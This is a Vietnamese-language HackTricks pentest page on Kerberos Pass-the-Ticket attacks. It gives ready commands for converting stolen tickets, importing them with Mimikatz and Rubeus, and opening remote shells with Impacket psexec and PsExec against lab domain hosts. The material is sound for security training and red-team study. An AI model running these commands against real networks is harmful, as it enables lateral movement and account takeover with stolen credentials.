# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Tổng quan

Trong một cuộc tấn công Pass-the-Ticket (PtT), kẻ tấn công sử dụng ticket Kerberos bị đánh cắp để xác thực với tư cách principal của ticket mà không cần có mật khẩu của tài khoản đó. Ticket-granting ticket (TGT) có thể được dùng để yêu cầu service ticket, còn service ticket bị đánh cắp chỉ có thể dùng với dịch vụ đích và trong thời hạn hiệu lực của nó.<sup>[[1]](#references)</sup>

Để biết các kỹ thuật thu thập ticket, xem:

- [Thu thập ticket từ Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Thu thập ticket từ Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Chuyển đổi định dạng ticket giữa Linux và Windows

Các Kerberos cache thường có dạng tệp MIT `ccache` trên Linux và tệp `.kirbi` trên Windows. `ticket_converter` chuyển đổi giữa các định dạng này bằng ticket đầu vào và đường dẫn đầu ra.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo cũng cung cấp các công cụ xử lý Kerberos ticket trên Windows.<sup>[[3]](#references)</sup>

## Sử dụng Ticket

Trên Linux, trỏ `KRB5CCNAME` đến cache và yêu cầu client Impacket sử dụng Kerberos mà không nhắc nhập mật khẩu:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Trên Windows, Mimikatz hoặc Rubeus có thể import ticket `.kirbi` vào phiên đăng nhập hiện tại. Dùng `klist` để kiểm tra cache kết quả.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Việc import ticket không cấp quyền vượt quá những quyền được ticket thể hiện và chính sách ủy quyền của dịch vụ đích. Ticket hết hạn, bị thu hồi, sai định dạng hoặc không đúng phạm vi có thể không hoạt động.<sup>[[1]](#references)</sup>

Để tìm hiểu rộng hơn về các cuộc tấn công Kerberos và những kỹ thuật liên quan để lấy ticket, hãy xem hướng dẫn tấn công Kerberos của Tarlogic.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Các ví dụ Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Các kỹ thuật tấn công Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
